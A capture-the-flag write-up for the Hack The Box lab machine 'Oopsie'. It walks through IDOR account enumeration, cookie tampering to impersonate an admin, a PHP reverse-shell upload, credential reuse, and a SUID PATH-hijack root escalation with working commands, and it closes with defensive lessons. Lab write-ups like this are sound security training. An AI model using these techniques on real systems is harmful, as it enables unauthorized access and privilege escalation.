# Oopsie

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 2) |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Techniques** | Broken access control, IDOR, cookie tampering, unrestricted file upload (RCE), SUID PATH hijack |

## Overview
Four distinct vulnerabilities chained. A hidden login portal offers guest access; the
app trusts client-controlled cookies for authorization and leaks every account via an
IDOR; tampering the cookie impersonates the super admin; an unrestricted upload gives
RCE; and a root-owned SUID binary that calls `cat` by name gives root via PATH hijack.

## Enumeration
```bash
nmap -p- --min-rate 1000 <TARGET_IP>
nmap -sC -sV -p 22,80 <TARGET_IP>
gobuster dir -u http://<TARGET_IP> -w .../directory-list-2.3-small.txt -x php,txt,html
# the login portal is NOT in the small wordlist; it is referenced by the homepage:
# /cdn-cgi/login  (found by proxying the site through Burp and reading its own requests)
```

## Exploitation
1. **Login as Guest**, which sets cookies like `user=2233; role=guest`.
2. **IDOR:** walk `admin.php?content=accounts&id=1,2,3...` to leak every account,
   including the super admin's Access ID (e.g. 34322). The server returns records
   without checking you may see them.
3. **Cookie tampering (broken access control):** set `user=34322; role=admin` to
   impersonate the super admin. The server trusts the cookie and never verifies it
   matches the logged-in guest. This exposes the uploads feature.
4. **Unrestricted upload -> RCE:** upload a PHP reverse shell; the uploads directory
   executes PHP, so browsing to it fires the shell as `www-data`. Reused DB creds in
   `/var/www/html/cdn-cgi/login/db.php` -> `su` to the real user.

## Privilege Escalation
```bash
id                                          # user is in group 'bugtracker'
find / -perm -u=s -type f 2>/dev/null       # SUID: /usr/bin/bugtracker
strings /usr/bin/bugtracker                 # it calls `cat` by NAME, not /bin/cat
# PATH hijack:
cd /tmp
echo '/bin/bash' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker                         # runs OUR cat as root -> root shell
```

## Key Takeaway
Enforce server-side authorization on every request; never trust client cookies for
role or identity. Fix IDOR with per-object ownership checks. Validate uploads and store
them non-executable. SUID binaries must call programs by absolute path and sanitise
`$PATH`.

## What tripped me up
I first tried a sudo `-c` trick that was rejected, which taught me that sudo (and this
SUID binary) match on the exact command, so GTFOBins-style escapes often have to be done
the exact allowed way. The PATH hijack also shadowed the real `cat`, so I had to read
the flag with a full path (`/bin/cat /root/root.txt`) after resetting `$PATH`.
